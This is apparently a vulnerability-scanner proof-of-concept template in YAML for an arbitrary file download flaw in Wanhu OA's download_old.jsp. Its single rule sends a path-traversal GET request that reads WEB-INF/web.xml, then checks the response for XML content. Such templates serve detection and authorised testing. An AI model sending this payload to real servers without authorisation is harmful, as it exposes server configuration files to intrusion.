name: poc-yaml-wanghu-oa-downloadold-file-download
binding: aa338d98-fb96-4ddc-82f1-581cad23254d
manual: true
detail:
    author: EASY(https://github.com/EASY233)
    links:
        - http://wiki.peiqi.tech/wiki/oa/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7OA%20download_old.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.html
    vulnerability:
        id: CT-517551
        level: medium
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"/WEB-INF/tag-lib/") && response.body.bstartsWith(b"<?xml")
expression: r0()
